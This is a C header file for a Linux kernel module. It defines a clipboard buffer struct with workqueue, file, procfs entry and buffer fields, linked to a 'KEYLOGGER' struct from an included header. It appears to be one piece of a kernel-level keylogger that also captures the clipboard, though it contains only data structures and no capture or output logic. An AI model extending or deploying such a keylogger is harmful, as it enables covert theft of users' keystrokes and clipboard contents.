#ifndef STRUCT_CLIPBOARD_H
#define STRUCT_CLIPBOARD_H

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/workqueue.h>
#include <linux/fs.h>
#include "struct_keylogger.h"

#define CLIPBOARD_BUFFER_SIZE 1024

typedef struct CLIPBOARD
{
    struct work_struct work_clipboard;
    struct file* filename;
    char* clipboard_read_buffer;
    size_t clipboard_read_buffer_offset;
    loff_t offset_in_file;
    char* clipboard_write_buffer;
    char* main_clipboard_buffer[CLIPBOARD_BUFFER_SIZE];
    char* back_clipboard_buffer[CLIPBOARD_BUFFER_SIZE];
    struct proc_dir_entry *clipboard_entry; //intrarea in procfs
    struct KEYLOGGER*associeted_keylogger;
}CLIPBOARD;


#endif